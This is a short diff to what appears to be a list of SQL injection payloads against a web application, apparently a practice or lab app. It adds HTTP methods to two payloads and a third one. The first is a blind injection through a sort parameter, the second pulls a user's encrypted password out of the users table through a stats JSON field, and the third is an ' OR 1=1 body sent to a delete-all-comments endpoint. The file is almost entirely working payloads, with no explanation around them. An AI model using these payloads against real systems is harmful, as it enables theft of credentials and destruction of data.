@@ -1,5 +1,9 @@
 1. sort
-/articles?sort=(CASE%20SUBSTR(text,%201,%201)%20WHEN%20'h'%20THEN%200%20else%201%20END)
+GET /articles?sort=(CASE%20SUBSTR(text,%201,%201)%20WHEN%20'h'%20THEN%200%20else%201%20END)
 
 2. calculate
-/stats/show?stats={%22table%22:%22article%22,%22operator%22:%22maximum%22,%22column%22:%22encrypted_password)%20FROM%20users%20WHERE%20email=%27test@test.com%27%3B%22}
+GET /stats/show?stats={%22table%22:%22article%22,%22operator%22:%22maximum%22,%22column%22:%22encrypted_password)%20FROM%20users%20WHERE%20email=%27test@test.com%27%3B%22}
+
+3. delete_all
+POST /users/1/delete_all_comments
+- With body: ' OR 1=1);
